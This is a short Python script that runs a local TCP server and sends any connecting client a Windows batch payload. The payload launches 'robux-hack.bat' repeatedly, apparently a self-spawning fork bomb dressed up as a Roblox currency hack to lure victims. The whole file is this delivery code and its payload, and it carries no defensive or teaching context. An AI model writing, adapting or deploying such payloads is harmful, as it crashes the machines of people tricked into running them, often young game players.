import socket

payload = b'@echo off\r\nstart robux-hack.bat\r\nstart robux-hack.bat\r\nstart robux-hack.bat'

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    host = '127.0.0.1'
    port = 47024

    s.bind((host, port))

    print('\n[] Bound socket to [%s: %s]\n' % (host, port))

    print('\n[] Listening for incoming connection...\n')

    s.listen(1)

    conn, addr = s.accept()
    with conn:
        print('[] Accepted connection from [%s: %s]' % (addr[0], addr[1]))
        try:
            print('\n[] Connected by ', addr[0], addr[1], '\n')
            conn.sendall(payload)
            print('[] Payload sent.\n')
            print(conn.recv(1024).decode('utf-8'))
            
        except BrokenPipeError as e:
            print('\n[ERROR] Got a broken pipe error.', e, '\n')
            conn.close()
            print('\n[] Connection closed.\n')

    conn.close()
    print('[] Connection closed.\n')
    s.close()
except OSError as e:
    print('Python being a bitch rn.', e)
